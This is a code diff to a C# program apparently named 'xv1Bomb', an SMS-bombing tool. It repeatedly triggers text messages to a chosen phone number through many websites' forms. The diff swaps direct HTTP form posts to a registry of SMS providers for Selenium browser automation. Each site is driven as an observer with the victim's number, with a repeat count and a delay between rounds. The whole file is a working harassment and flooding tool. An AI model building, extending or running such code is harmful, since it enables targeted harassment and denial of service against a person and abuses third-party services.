@@ -1,33 +1,38 @@
 ﻿using System.Collections.Generic;
-using System.Net.Http;
 using System;
+using OpenQA.Selenium;
 using System.Threading;
 using System.Threading.Tasks;
-using Microsoft.Extensions.Logging;
-using Newtonsoft.Json;
+using OpenQA.Selenium.Chrome;
 
 namespace xv1Bomb
 {
-    public class Bomber
-    {
-        public async Task StartBombing(string phoneNumber,CancellationToken ct ,int repeat,int delay)
-        {
-            HttpClient client = new HttpClient();
+    public class Bomber : IObserveable {
+        private List<IObserver> Websites { get; set; }
+        private IWebDriver WebDriver { get; set; }
 
+        public Bomber() {
+            this.Websites = new List<IObserver>();
+            WebDriver = new ChromeDriver();
+        }
+
+        public void AddObserver(IObserver o) {
+            Websites.Add(o);
+        }
+        
+        public void RemoveObserver(IObserver o) {
+            Websites.Remove(o);
+        }
+
+        public async Task Start(string phoneNumber,CancellationToken ct ,int repeat,int delay) {
             for (int i = 0;i<repeat;i++) {
-                foreach (var site in smsProviderRegistry.smsProviders)
-                {
-                    if (!ct.IsCancellationRequested)
-                    {
-                        var json = site.json.Replace("@",phoneNumber);
-                        var content = new FormUrlEncodedContent(JsonConvert.DeserializeObject<Dictionary<string,string>>(json));
-                        var resp = await client.PostAsync(site.link, content);
-                        
+                foreach (var site in Websites) {
+                    if (!ct.IsCancellationRequested) {
                         Console.ForegroundColor = ConsoleColor.DarkMagenta;
-                        Console.WriteLine(site.link);
+                        Console.WriteLine(site.Link);
                         Console.ForegroundColor = ConsoleColor.White;
-                        Console.WriteLine(resp.ToString());
-
+                        WebDriver.Navigate().GoToUrl(site.Link);
+                        site.Handle(WebDriver,phoneNumber);
                         Thread.Sleep(delay);
                     } else break;
                 }
